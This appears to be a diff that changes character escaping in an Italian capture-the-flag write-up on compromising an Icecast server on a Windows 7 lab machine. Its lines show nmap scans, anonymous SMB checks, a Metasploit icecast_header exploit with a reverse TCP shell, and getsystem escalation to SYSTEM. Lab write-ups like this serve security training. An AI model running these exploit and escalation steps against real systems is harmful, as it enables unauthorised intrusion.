@@ -101,7 +101,7 @@ L'accesso guest sembra accettato. provando login anonimo:
 
 smbclient -L //10.113.129.152 -N
 
-Anonymous login successful, ma nessuna share elencata (SMB1 disabled -- no workgroup available). Pista SMB rimane chiusa
+Anonymous login successful, ma nessuna share elencata (SMB1 disabled &#45;&#45; no workgroup available). Pista SMB rimane chiusa
 
 ---
 
@@ -115,7 +115,7 @@ individuo i parametri richiesti: RHOSTS, RPORT (già 8000), e per il payload di 
 
 msfconsole -q -x "use exploit/windows/http/icecast_header; set RHOSTS 10.113.129.152; set RPORT 8000; set LHOST 192.168.156.12; set LPORT 4444; run"
 
-Started reverse TCP handler...
+Started reverse TCP handler&#46;&#46;&#46;
 Exploit completed, but no session was created.
 
 Nessuna sessione. riprovo cambiando payload (windows/shell_reverse_tcp) e poi su un IP diverso della macchina respawnata, ma stesso risultato.
@@ -132,7 +132,7 @@ nmap -Pn -p8000 -sV 10.113.164.135
 La porta 8000 si è chiusa su quella specifica istanza della macchina. Non è un problema di sintassi dell'exploit, è che il servizio Icecast semplicemente non parte su alcuni spawn/cessa di esistere. 
 Dopo diversi dispendiosi riavvii della lab machine dalla piattaforma, trovo finalmente un'istanza con la porta aperta:
 
-nmap -Pn -p- --open -T4 10.113.132.102
+nmap -Pn -p- &#45;&#45;open -T4 10.113.132.102
 8000/tcp open  http-alt
 
 Ore perse per un problema di infrastruttura della room, non di esecuzione. Rilancio l'exploit sul nuovo target settando i nuovi parametri:
@@ -165,7 +165,7 @@ meterpreter > getsystem
 provo a creare una shell per raccogliere informazioni in più sul sistema:
 
 meterpreter > shell
-C:\Program Files (x86)\Icecast2 Win32> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+C:\Program Files (x86)\Icecast2 Win32> systeminfo &#124; findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 
 OS Name: Microsoft Windows 7 Professional
 OS Version: 6.1.7601 Service Pack 1
@@ -190,7 +190,7 @@ Nuova sessione, ma getuid restituisce ancora Dark-PC\Dark e non altro.
 nonostante questo la sessione 2 ha molti più privilegi abilitati (SeDebugPrivilege, SeImpersonatePrivilege, SeBackupPrivilege, altri). Riprovo getsystem su questa sessione:
 
 sessions -C "getsystem" -i 2
-...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+&#46;&#46;&#46;got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
 
 sessions -C "getuid" -i 2
 Server username: NT AUTHORITY\SYSTEM
@@ -277,7 +277,7 @@ Listing: C:\Users\Dark
 100666/rw-rw-rw-  524288  fil  2026-08-25 17:38:23  NTUSER.DAT
 100666/rw-rw-rw-  262144  fil  2026-08-25 17:38:23  ntuser.dat.LOG1
 100666/rw-rw-rw-  0       fil  2019-11-12 22:48:31  ntuser.dat.LOG2
-ecc...
+ecc&#46;&#46;&#46;
 
 ---
 
